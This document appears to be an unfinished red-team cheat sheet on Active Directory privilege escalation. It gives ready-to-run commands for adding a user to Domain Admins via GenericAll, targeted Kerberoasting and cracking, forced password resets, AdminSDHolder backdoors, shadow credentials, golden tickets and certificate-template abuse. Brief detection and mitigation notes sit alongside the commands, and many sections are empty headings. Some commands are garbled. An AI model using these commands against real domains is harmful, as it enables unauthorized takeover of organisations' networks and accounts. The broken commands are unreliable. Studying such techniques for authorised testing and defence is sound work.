<details>
<summary> DACL/ACL-Based Escalation (GenericAll / WriteDACL / WriteProperty)</summary>
 <br> 
Exploiting “Generic ALL” Privilege
 
***User Own Generic All Right for Group***
 Assuming the Red Teamer knows the credential for Users as a Standard Domain Users and would like to enumerate the other Domain users & Admin members with the help of “net-rpc” Samba command line Utility.
 
    net rpc user -U <domain>/<user>%'<Password>' -S <DC ip>
    net rpc group members "Domain Admins" -U <domain>/<user>%'<Password>' -S <DC ip>
Bloodhound -Hunting for Weak Permission
Use BloodHound to Confirm Privileges: You can use BloodHound to verify that Komal has the Generic ALL right on the Domain Admins group.

    bloodhound-python -u <user> -p <Password> -ns <dc ip> -d <domain-name> -c All
Thus it has shown the User has Generic ALL privilege to Domain Admin group and provided steps for exploitation to be proceed. 

Method for Exploitation – Account Manipulation
1. Linux Net RPC – Samba
The tester can abuse this permission by Komal User into Domain Admin group and list the domain admin members to ensure that Komal Users becomes Domain Admin.

       net rpc group addmem "Domain Admins" "<user>" -U <domain-name>/<user>%'<Password>' -S <dc-ip>
 
2. Linux Bloody AD
   
       bloodyAD --host "<dc-ip>" -d "<domain-name>" -u "<user>" -p "<Password>" add groupMember "Domain Admins" "<user>"
 Thus, from the user property we can see user has become a member of domain admin. 
3. Windows Net command

    net group "domain admins" <user> /add /domain

***User’s own generic Right for another user*** 
Bloodhound -Hunting for Weak Permissions

    bloodhound-python -u <A-user> -p <Password> -ns <DC-Ip> -d <Domain-name> -c All
 From the graph, it can be observed that the A user owns generic all privileges on B user.
 
***Cloning the Targeted Kerberoast Tool***
To perform this attack, first, clone the targetedKerberoast repository from GitHub using the following command:

    git clone https://github.com/ShutdownRepo/targetedKerberoast.git

    ./targetedKerberoast.py --dc-ip '<DC ip>' -v -d '<Domain name>' -u '<A user>' -p '<Password>'
This type of attack is ideally best when the attacker is not willing to change the password for the target user <B user in our case>, even generic all privilege is enabled for the compromised user. Yes, this step is less noisy than changing the password of any user.
Further, with the help of John the Ripper and a dictionary such as Rock You can help the attacker to brute force the weak password.

       john -w=/usr/share/wordlist/rockyou.txt hash

***Change Password**
Linux Net RPC – Samba

    net rpc password vipin 'Password@987' -U ignite.local/nishant%'Password@1' -S 192.168.1.8

Linux Net RPC – BloodAD

    bloodyAD --host "<DC-ip>" -d "<Domain-name>" -u "<a user>" -p "<Password>" set password "<B user>" "<Password>"

Linux Net RPC –Rpcclient

    rpcclient -U <Domain name>/<A user> <DC IP>
    setuserinfo <B user> 23 <Password>

Windows Net Utility

    net user <B user> <Password> /domain

Windows PowerShell -Powerview

    $SecPassword = ConvertTo-SecureString '<Password>' -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential('<domain name B user>', $SecPassword)

Windows PowerShell

    $NewPassword = ConvertTo-SecureString '<Password>' -AsPlainText -Force
    Set-DomainUserPassword -Identity '<b user>' -AccountPassword $NewPassword
</details>
<details>
<summary>AdminSDHolder Abuse</summary>
 <br>  
The AdminSDHolder object enforces consistent ACLs on protected groups (like Domain Admins). If you can alter its ACL, the change propagates via SDProp to all members 

🔍 Detection
Search for AdminSDHolder ACLs:

powershell

    Get-ADUser -LDAPFilter "(AdminCount=1)" ...
    Get-ACL "AD:CN=AdminSDHolder,CN=System,DC=domain,DC=com"
⚙️ Exploitation

powershell

    Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,...' -PrincipalSamAccountName attacker -Rights All
You’ll gain long-term privileged membership.

🛡️ Mitigation

Restrict ACL modifications on AdminSDHolder.

Monitor event logs for changes (event IDs 4662, 4670).
</details>
<details>
<summary>Resource-Based Constrained Delegation (RBCD) Abuse</summary>
 <br> 

Control over a computer object plus delegation rights can allow you to impersonate users to services—escalating to SYSTEM or DC-level access via Kerberos ticket forging.

🔍 Detection
Use BloodHound to detect AllowedToDelegateTo paths. Query with:

powershell

    Get-ADComputer -Properties msDS-AllowedToDelegateTo
⚙️ Exploitation
Create a computer account (e.g. attacker$) and set delegation rights:

powershell

    Set-ADComputer target$ -Add @{msDS-AllowedToDelegateTo='attacker$'}
Then issue Kerberos tickets with Rubeus or Impacket.

🛡️ Mitigation

Limit delegation rights.

Audit msDS-AllowedToDelegateTo attributes.

Disable unconstrained delegation unless required.
</details>
<details>
<summary>Shadow Credentials</summary>
 <br> 

If you can write to the msDS-KeyCredentialLink attribute on an object, you can create a "shadow credential" (certificate) to authenticate as them via Kerberos PKINIT without needing passwords 
HADESS

🔍 Detection
Check write permissions on this attribute via BloodHound or PowerView:

powershell

    Get-ACL object | Select-Object rights
⚙️ Exploitation
Use Whisker.exe:

powershell

    Whisker.exe add /target:CompAccount$
Then obtain TGT via certificate-based authentication with Rubeus.

🛡️ Mitigation

Disable unnecessary write access to msDS-KeyCredentialLink.

Monitor certificate enrollment events.

Enforce Windows ≥2016 with Kerberos protections.
</details>
<details>
<summary>SID History Injection</summary>
 <br> 

If you can modify SIDHistory (or have KRBTGT hash), you can inject high-privilege SIDs into your account and forge golden tickets for domain admin access.

🔍 Detection
Check SIDHistory values via ADSI or BloodHound.

⚙️ Exploitation
Use Mimikatz:

powershell

    kerberos::golden /user:attacker /sid:<DA_SID> 
Forge TGT tickets to escalate.

🛡️ Mitigation

Monitor creation of unusual tickets or SIDHistory changes (Event ID 4720/4732).

Secure KRBTGT hash with frequent password resets.
</details>
<details>
<summary>Trust Exploitation / Foreign Security Principals Abuse</summary>
 <br>
 Trust Exploitation / Foreign Security Principals Abuse

In multi-domain or multi-forest environments, trust misconfigurations allow abused FSP entries from other realms to escalate via cross-domain ACLs.

🔍 Detection
BloodHound shows trust paths and unresolved SIDs.

⚙️ Exploitation
Add FSP SID from trusted domain into a privileged group using ACL editing.

🛡️ Mitigation

Enable SID filtering.

Validate cross-domain ACLs for resolved accounts only.
</details>
<details>
<summary>gMSA Password Disclosure</summary>
 <br>
 gMSA Password Disclosure

If you can read msDS-ManagedPassword, you can retrieve the machine account password of a Group Managed Service Account to impersonate it.

🔍 Detection
Check ACL on gMSA:

powershell

    Get-ADServiceAccount gmsa -Properties msDS-ManagedPassword
ConvertFrom-ADManagedPasswordBlob ...
⚙️ Exploitation
With ReadGMSAPassword rights, extract credentials via PowerShell (ConvertFrom-ADManagedPasswordBlob).

🛡️ Mitigation

Restrict read ACLs for these attributes.

Monitor gMSA password retrieval events.
</details>
<details>
<summary>Golden Ticket Forgery (KRBTGT compromise)</summary>
 <br>
If you can extract KRBTGT NTLM hash (e.g. via DCSync), you can issue valid TGTs for any domain user—including Domain Admins—without contacting KDC.

🔍 Detection
Monitor long-lifetime TGT events (Event ID 4768) or hash extraction attempts.

⚙️ Exploitation
Use Mimikatz:

powershell

    kerberos::golden /user:Administrator /krbtgt:<hash> /domain:domain.com
Inject ticket with /ptt.

🛡️ Mitigation

Periodically reset KRBTGT twice.

Monitor DCSync and TGT creation anomalies.
</details>
<details>
<summary>Kerberoasting</summary>
<br>
</details>

<details>
<summary>AS-REP Roasting</summary>
<br>
</details>

<details>
<summary>Silver Ticket (Forged TGS)</summary>
<br>
</details>


<details>
<summary>DCSync / Replication Attacks</summary>
<br>
</details>

<details>
<summary>Unconstrained Delegation Abuse</summary>
<br>
</details>

<details>
<summary>Constrained Delegation Abuse</summary>
<br>
</details>





<details>
<summary>DACL/ACL-Based Escalation via DCOM / WMI / RDP</summary>
<br>
</details>

<details>
<summary>Group Policy Preferences (GPP) Passwords</summary>
<br>
</details>


<details>
<summary>Printer Bug / NTLM Relay via Print Spooler</summary>
<br>
</details>

<details>
<summary>Pass-the-Hash</summary>
<br>
</details>

<details>
<summary>Pass-the-Ticket</summary>
<br>
</details>

<details>
<summary>Overpass-the-Hash</summary>
<br>
</details>

<details>
<summary>DCShadow Attack</summary>
<br>
</details>

<details>
<summary>LAPS Password Disclosure</summary>
<br>
</details>

<details>
<summary>Kerberos Key Distribution Center (KDC) Spoofing</summary>
<br>
</details>

<details>
<summary>Certificate Services Abuse (e.g., ESC1–ESC8)</summary>
<br>

Abusing Certificate Templates or CA permissions can allow low-privilege users to enroll certs for high-risk purposes (e.g. escrow, domain authentication), leading to full domain compromise 

🔍 Detection

Use certipy, bloodhound or certify to enumerate templates and CA ACLs.

Check for templates that allow enrollment to Authenticated Users.

⚙️ Exploitation
Certipy or PowerView:

powershell
Copy
Edit
Certipy find
Certipy enroll attacker -template vulnerableTemplate
Use resulting certificate to authenticate via PKINIT.

🛡️ Mitigation

Secure template ACLs (use principle of least privilege).

Require CA manager approval for templates.

Monitor certificate issuance logs.
</details>
